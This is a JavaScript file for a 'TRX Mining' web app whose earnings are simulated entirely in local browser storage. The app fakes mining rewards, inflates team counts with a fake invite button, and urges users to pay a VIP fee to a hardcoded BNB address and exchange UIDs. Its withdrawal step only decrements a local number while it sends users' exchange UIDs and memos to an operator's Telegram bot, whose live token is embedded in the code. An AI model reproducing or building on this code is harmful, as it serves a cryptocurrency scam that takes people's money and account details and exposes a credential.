/* script.js - TRX Mining Live (mobile-first) */

// ---------------- CONFIG (edit if needed) ----------------
const TELEGRAM_BOT_TOKEN = "8360712858:AAEB13jcCnyhm1UnHsj5fbc2w_2pBPL6L1s"; // your token (you provided)
const ADMIN_CHAT_ID = "5550926280"; // your admin/chat id

const TRX_PRICE_USDT = 0.002;
const REWARD_TRX = 5;
const MINING_DURATION_MS = 2 * 60 * 60 * 1000; // 2 hours
const NEW_ACCOUNT_TRX = 20;
const VIP_FEE_USDT = 0.10;
const VIP_DAILY_USDT = 0.05;
const VIP_MULTIPLIER = 50;
const BNB_ADDR = "0x53f90e7a0d2834b772890f4f456d51aaed61de43";
const BITGET_UID = "9879164714";
const BYBIT_UID = "269645993";

// ---------------- localStorage helpers ----------------
function getState(k,d){ try{ const v = localStorage.getItem(k); return v?JSON.parse(v):d; } catch(e){ return d; } }
function setState(k,v){ localStorage.setItem(k,JSON.stringify(v)); }

// ---------------- initial state ----------------
let state = getState('trx_app_v1', {
  trx: NEW_ACCOUNT_TRX,
  usdt: (NEW_ACCOUNT_TRX * TRX_PRICE_USDT),
  teamCount: 0,
  miningActive: false,
  miningEnd: null,
  isVIP: false,
  refId: null
});

// ---------------- dom ----------------
const pages = { mine: document.getElementById('page-mine'), team: document.getElementById('page-team'), me: document.getElementById('page-me'), vip: document.getElementById('page-vip') };
const navBtns = Array.from(document.querySelectorAll('.nav-btn'));
const trxAmountEl = document.getElementById('trxAmount');
const meTRXEl = document.getElementById('meTRX');
const meUSDTEl = document.getElementById('meUSDT');
const progressInner = document.getElementById('progressInner');
const progressTimer = document.getElementById('progressTimer');
const mineActionBtn = document.getElementById('mineActionBtn');
const mineStatus = document.getElementById('mineStatus');
const mineMessage = document.getElementById('mineMessage');
const refLinkEl = document.getElementById('refLink');
const teamCountEl = document.getElementById('teamCount');
const copyRefBtn = document.getElementById('copyRefBtn');

// modals & inputs
const modalConvert = document.getElementById('modalConvert');
const convertInput = document.getElementById('convertInput');
const convertDo = document.getElementById('convertDo');
const convertResult = document.getElementById('convertResult');
const closeConvert = document.getElementById('closeConvert');

const modalWithdraw = document.getElementById('modalWithdraw');
const withdrawMethod = document.getElementById('withdrawMethod');
const withdrawUID = document.getElementById('withdrawUID');
const withdrawAmount = document.getElementById('withdrawAmount');
const submitWithdraw = document.getElementById('submitWithdraw');
const withdrawMsg = document.getElementById('withdrawMsg');
const closeWithdraw = document.getElementById('closeWithdraw');

const modalRecharge = document.getElementById('modalRecharge');
const closeRecharge = document.getElementById('closeRecharge');

const vipExchange = document.getElementById('vipExchange');
const vipSenderUID = document.getElementById('vipSenderUID');
const vipMemo = document.getElementById('vipMemo');
const vipFile = document.getElementById('vipFile');
const vipSubmit = document.getElementById('vipSubmit');
const vipMsg = document.getElementById('vipMsg');

const cycleLabel = document.getElementById('cycleLabel');
const rewardLabel = document.getElementById('rewardLabel');
const priceLabel = document.getElementById('priceLabel');
const speedLabel = document.getElementById('speedLabel');
const vipFeeLabel = document.getElementById('vipFeeLabel');
const bitgetUIDEl = document.getElementById('bitgetUID');
const bybitUIDEl = document.getElementById('bybitUID');

if(bitgetUIDEl) bitgetUIDEl.innerText = BITGET_UID;
if(bybitUIDEl) bybitUIDEl.innerText = BYBIT_UID;

cycleLabel && (cycleLabel.innerText = (MINING_DURATION_MS/(1000*60*60)) + " hours");
rewardLabel && (rewardLabel.innerText = REWARD_TRX + " TRX");
priceLabel && (priceLabel.innerText = `1 TRX = ${TRX_PRICE_USDT} USDT`);
vipFeeLabel && (vipFeeLabel.innerText = `${VIP_FEE_USDT.toFixed(2)} USDT`);
speedLabel && (speedLabel.innerText = `1.5 TRX/H`);

// ---------------- nav ----------------
navBtns.forEach(btn=>{
  btn.addEventListener('click', ()=>{
    navBtns.forEach(b=>b.classList.remove('active'));
    btn.classList.add('active');
    const target = btn.dataset.target;
    Object.values(pages).forEach(p=>p.classList.remove('active'));
    document.getElementById(target).classList.add('active');
  });
});

// ---------------- render ----------------
let miningInterval = null;
function renderAll(){
  trxAmountEl.innerText = parseFloat(state.trx).toFixed(2);
  meTRXEl && (meTRXEl.innerText = parseFloat(state.trx).toFixed(2));
  meUSDTEl && (meUSDTEl.innerText = parseFloat(state.usdt).toFixed(6));
  teamCountEl && (teamCountEl.innerText = state.teamCount);
  if(!state.refId){ state.refId = Math.random().toString(36).slice(2,9); setState('trx_app_v1', state); }
  refLinkEl && (refLinkEl.value = `${location.origin}${location.pathname}?ref=${state.refId}`);
  updateMiningUI();
  setState('trx_app_v1', state);
}

function updateMiningUI(){
  if(state.miningActive && state.miningEnd){
    const remaining = state.miningEnd - Date.now();
    if(remaining <= 0){
      progressInner.style.width = '100%';
      progressTimer.innerText = 'Ready to claim';
      mineActionBtn.innerText = `Collect Reward (${calcReward()} TRX)`;
      mineActionBtn.disabled = false;
      mineStatus.innerText = 'Completed';
      mineActionBtn.onclick = collectReward;
      if(miningInterval){ clearInterval(miningInterval); miningInterval = null; }
    } else {
      const pct = Math.max(0, Math.min(100, ((MINING_DURATION_MS - remaining)/MINING_DURATION_MS)*100));
      progressInner.style.width = pct + '%';
      const hrs = Math.floor(remaining / (1000*60*60));
      const mins = Math.floor((remaining % (1000*60*60)) / (1000*60));
      const secs = Math.floor((remaining % (1000*60)) / 1000);
      progressTimer.innerText = `Time: ${hrs}h ${mins}m ${secs}s`;
      mineActionBtn.innerText = 'Mining...';
      mineActionBtn.disabled = true;
      mineStatus.innerText = 'Mining';
      if(!miningInterval){
        miningInterval = setInterval(()=>{ updateMiningUI(); },1000);
      }
    }
  } else {
    progressInner.style.width = '0%';
    progressTimer.innerText = 'Not started';
    mineActionBtn.innerText = 'Start Mining';
    mineActionBtn.disabled = false;
    mineStatus.innerText = 'Not started';
    mineActionBtn.onclick = startMining;
    if(miningInterval){ clearInterval(miningInterval); miningInterval = null; }
  }
}

function calcReward(){ let r = REWARD_TRX; if(state.isVIP) r *= VIP_MULTIPLIER; return r; }

// ---------------- mining ----------------
function startMining(){
  if(state.miningActive) return;
  state.miningActive = true;
  state.miningEnd = Date.now() + MINING_DURATION_MS;
  setState('trx_app_v1', state);
  mineMessage && (mineMessage.innerText = `Mining started — come back after ${MINING_DURATION_MS/(1000*60*60)} hours to claim.`);
  renderAll();
}

function collectReward(){
  const reward = calcReward();
  state.trx = parseFloat((parseFloat(state.trx) + reward).toFixed(6));
  state.usdt = parseFloat((state.trx * TRX_PRICE_USDT).toFixed(6));
  state.miningActive = false;
  state.miningEnd = null;
  setState('trx_app_v1', state);
  mineMessage && (mineMessage.innerText = `✅ You collected ${reward} TRX!`);
  sendTelegramMessage(`⛏️ Claim\nRef:${state.refId}\nReward:${reward} TRX\nNew TRX:${state.trx.toFixed(2)}`);
  renderAll();
}

// ---------------- convert ----------------
document.getElementById('openConvert')?.addEventListener('click', ()=> modalConvert.classList.remove('hidden'));
document.getElementById('closeConvert')?.addEventListener('click', ()=> modalConvert.classList.add('hidden'));
convertDo?.addEventListener('click', ()=>{
  const v = parseFloat(convertInput.value || 0);
  if(!v || v <= 0){ alert('Enter TRX amount'); return; }
  if(v > state.trx){ alert('Not enough TRX'); return; }
  const converted = v * TRX_PRICE_USDT;
  state.trx = parseFloat((state.trx - v).toFixed(6));
  state.usdt = parseFloat((state.usdt + converted).toFixed(6));
  setState('trx_app_v1', state);
  convertResult.innerText = `Converted ${v} TRX → ${converted.toFixed(6)} USDT`;
  sendTelegramMessage(`🔁 Convert\nRef:${state.refId}\nTRX:${v}\nUSDT:${converted.toFixed(6)}`);
  renderAll();
});

// ---------------- withdraw ----------------
document.getElementById('openWithdraw')?.addEventListener('click', ()=> modalWithdraw.classList.remove('hidden'));
document.getElementById('closeWithdraw')?.addEventListener('click', ()=> modalWithdraw.classList.add('hidden'));
submitWithdraw?.addEventListener('click', ()=>{
  const uid = withdrawUID.value.trim();
  const amount = parseFloat(withdrawAmount.value||0);
  if(!uid){ alert('Enter UID'); return; }
  if(isNaN(amount) || amount <= 0){ alert('Enter valid amount'); return; }
  if(amount > state.usdt){ alert('Not enough USDT'); return; }
  state.usdt = parseFloat((state.usdt - amount).toFixed(6));
  setState('trx_app_v1', state);
  withdrawMsg.innerText = `Withdraw submitted: ${amount.toFixed(6)} USDT to ${withdrawMethod.value} UID ${uid}`;
  sendTelegramMessage(`💸 Withdraw\nRef:${state.refId}\nMethod:${withdrawMethod.value}\nUID:${uid}\nAmount:${amount.toFixed(6)} USDT`);
  renderAll();
});

// ---------------- recharge modal ----------------
document.getElementById('openRecharge')?.addEventListener('click', ()=> modalRecharge.classList.remove('hidden'));
document.getElementById('closeRecharge')?.addEventListener('click', ()=> modalRecharge.classList.add('hidden'));

// ---------------- VIP submit ----------------
vipSubmit?.addEventListener('click', ()=>{
  const exch = vipExchange.value;
  const sender = vipSenderUID.value.trim();
  const memo = vipMemo.value.trim();
  const file = vipFile.files[0];
  if(!sender || !memo){ alert('Enter UID and memo'); return; }
  // store request locally & notify admin
  const req = { ref: state.refId, exchange: exch, sender, memo, time: Date.now() };
  const arr = getState('vip_requests', []);
  arr.push(req);
  setState('vip_requests', arr);
  vipMsg.innerText = 'VIP request submitted for review (demo).';
  sendTelegramMessage(`🌟 VIP Request\nRef:${state.refId}\nExchange:${exch}\nSender:${sender}\nMemo:${memo}\nFee:${VIP_FEE_USDT} USDT`);
  // If file provided, save base64 demo
  if(file){
    const reader = new FileReader();
    reader.onload = e => { setState(`vip_proof_${Date.now()}`, e.target.result); };
    reader.readAsDataURL(file);
  }
  renderAll();
});

// ---------------- invite / copy ----------------
document.getElementById('fakeInviteBtn')?.addEventListener('click', ()=>{
  state.teamCount = parseInt(state.teamCount) + 1;
  setState('trx_app_v1', state);
  renderAll();
});
copyRefBtn?.addEventListener('click', ()=> {
  navigator.clipboard && navigator.clipboard.writeText(refLinkEl.value);
  alert('Referral link copied!');
});

// ---------------- Telegram send ----------------
function sendTelegramMessage(message){
  if(!TELEGRAM_BOT_TOKEN || !ADMIN_CHAT_ID){ console.log('TG not configured:', message); return; }
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  fetch(url, {
    method:'POST',
    headers:{ 'Content-Type':'application/json' },
    body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'HTML' })
  }).then(r=>r.json()).then(j=>console.log('tg ok', j)).catch(e=>console.error('tg err', e));
}

// ---------------- startup ----------------
(function init(){
  // ensure numeric types
  state.trx = parseFloat(state.trx);
  state.usdt = parseFloat(state.usdt);
  // restore miningActive if present
  if(state.miningActive && state.miningEnd){
    // keep as is; update UI
  } else { state.miningActive = false; state.miningEnd = null; }
  renderAll();
})();
